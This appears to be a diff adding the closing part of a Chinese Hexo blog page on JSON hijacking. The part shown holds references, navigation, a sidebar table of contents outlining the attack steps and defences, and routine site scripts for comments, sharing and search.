+<li><span style="color: black; font-family: 仿宋; font-size: 12pt;"><a href="http://stackoverflow.com/questions/2067472/what-is-jsonp-all-about" target="_blank" rel="external">http://stackoverflow.com/questions/2067472/what-is-jsonp-all-about</a><br></span></li>
+<li><span style="color: black; font-family: 仿宋; font-size: 12pt;"><a href="http://www.wooyun.org/bugs/wooyun-2010-046" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-046</a><br></span></li>
+<li><span style="color: black; font-family: 仿宋; font-size: 12pt;"><a href="http://www.csdn.net/article/2015-07-14/2825207" target="_blank" rel="external">http://www.csdn.net/article/2015-07-14/2825207</a><br></span></li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>your support will encourage me to continue to create!</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/alipay.jpg" alt="RuJia Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/e2-80-8bweb-e5-ae-89-e5-85-a8-e5-9f-ba-e7-a1-80-e7-9f-a5-e8-af-86-e7-b3-bb-e5-88-97-e7-82-b9-e5-87-bb-e5-8a-ab-e6-8c-81-ef-bc-88clickjacking-ef-bc-89.html" rel="next" title="​【WEB安全】WEB安全基础知识系列-点击劫持（CLICKJACKING）">
+                <i class="fa fa-chevron-left"></i> ​【WEB安全】WEB安全基础知识系列-点击劫持（CLICKJACKING）
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/Reading Notes Of RFC 2616 P1.html" rel="prev" title="Reading Notes Of 《RFC 2616, HTTP/1.1》 Part1">
+                Reading Notes Of 《RFC 2616, HTTP/1.1》 Part1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          <pre><code><b>版权声明</b>:自由转载-非商用-非衍生-保持署名<a href="https://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh" rel="external nofollow" >(创意共享3.0许可证)</a></code></pre>
+
+
+
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="RuJia" />
+          <p class="site-author-name" itemprop="name">RuJia</p>
+          <p class="site-description motion-element" itemprop="description">BlockChain,Distributed Computing</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">91</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">38</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/rjgeek/" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="" target="_blank" title="Others">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Others
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.cs.bham.ac.uk/~mdr/" title="Professor Mark Ryan" target="_blank" rel="external nofollow" >Professor Mark Ryan</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.cs.bham.ac.uk/~rzb/" title="Dr Rami Bahsoon" target="_blank" rel="external nofollow" >Dr Rami Bahsoon</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://sec.cs.bham.ac.uk/people/" title="The Security and Privacy Group" target="_blank" rel="external nofollow" >The Security and Privacy Group</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.yfgeek.com/" title="YFGeek" target="_blank" rel="external nofollow" >YFGeek</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://rjgeek.github.io/CV1.pdf" title="My CV" target="_blank" rel="external nofollow" >My CV</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#JavaScript-Hijacking和CSRF很相像，唯一不同的是，CSRF是模拟你的身份去发送请求，JavaScript-Hijacking是模拟你的身份，窃取你在服务器上的私隐信息。"><span class="nav-number">1.</span> <span class="nav-text">JavaScript Hijacking和CSRF很相像，唯一不同的是，CSRF是模拟你的身份去发送请求，JavaScript Hijacking是模拟你的身份，窃取你在服务器上的私隐信息。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-攻击原理"><span class="nav-number">2.</span> <span class="nav-text">1.攻击原理:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Json-Hijacking攻击的思想见下图："><span class="nav-number">3.</span> <span class="nav-text">Json Hijacking攻击的思想见下图：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">4.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#（1）-你正常访问信任站点（http-www-Bank-com），然后登陆信任站点。"><span class="nav-number">5.</span> <span class="nav-text">（1）.你正常访问信任站点（http://www.Bank.com），然后登陆信任站点。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#（2）-信任站点通过你的验证，并返回Cookie。"><span class="nav-number">6.</span> <span class="nav-text">（2）.信任站点通过你的验证，并返回Cookie。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#（3）-这时，在你还没有登出信任站点之前，你再打开了一个浏览器的tab页，并访问了一个恶意站点（www-BadGuy-com）。"><span class="nav-number">7.</span> <span class="nav-text">（3）.这时，在你还没有登出信任站点之前，你再打开了一个浏览器的tab页，并访问了一个恶意站点（www.BadGuy.com）。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#（4）-恶意站点向请求用户访问http-www-Bank-com的一个资源。"><span class="nav-number">8.</span> <span class="nav-text">（4）.恶意站点向请求用户访问http://www.Bank.com的一个资源。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#（5）-浏览器带着之前的Cookie信息，向信任站点发送一个AJAX的GET请求或者JSONP跨域请求"><span class="nav-number">9.</span> <span class="nav-text">（5）.浏览器带着之前的Cookie信息，向信任站点发送一个AJAX的GET请求或者JSONP跨域请求</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#（6）-信任站点验证的Cookie信息通过，根据请求返回一个JSON数组或者回调数据如mycallback-‘id’-’123’-。"><span class="nav-number">10.</span> <span class="nav-text">（6）.信任站点验证的Cookie信息通过，根据请求返回一个JSON数组或者回调数据如mycallback({‘id’:’123’})。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#（7）-你的浏览器收到来自http-www-Bank-com的响应后，转发响应中的JSON信息给恶意站点。至此，恶意站点拿到你关于http-www-Bank-com的信息。"><span class="nav-number">11.</span> <span class="nav-text">（7）.你的浏览器收到来自http://www.Bank.com的响应后，转发响应中的JSON信息给恶意站点。至此，恶意站点拿到你关于http://www.Bank.com的信息。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-JSONP的介绍"><span class="nav-number">12.</span> <span class="nav-text">2.JSONP的介绍:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-攻击举例"><span class="nav-number">13.</span> <span class="nav-text">2.攻击举例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-漏洞防御"><span class="nav-number">14.</span> <span class="nav-text">4.漏洞防御:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-总结与思考"><span class="nav-number">15.</span> <span class="nav-text">4.总结与思考:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-引用"><span class="nav-number">16.</span> <span class="nav-text">5.引用:</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">RuJia</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io" rel="external nofollow">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next" rel="external nofollow">
+    NexT.Mist
+  </a>
+  <span id="busuanzi_container_site_pv">
+    Total visited 本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  </span>
+  
+  <span id="busuanzi_container_site_uv">
+  Total visitors 本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  </span>
+
+</div>
+
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>
+
+
+
+  
+
+
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'ehcoo';
+      var disqus_identifier = 'json-hijacking.html';
+      var disqus_title = "​【WEB安全】WEB安全基础知识系列- JSON Hijacking";
+      var disqus_url = 'http://www.ehcoo.com/json-hijacking.html';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        var disqus_config = function () {
+            this.page.url = disqus_url;
+            this.page.identifier = disqus_identifier;
+            this.page.title = disqus_title;
+        };
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = false;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = decodeURIComponent(data.url);
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title >= 0 || index_content >= 0 ){
+                                isMatch = true;
+								if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            } 
+							
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+  </script>
+
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for (i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  </script>
+  <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+  
+
+  
+
+
+</body>
+</html>
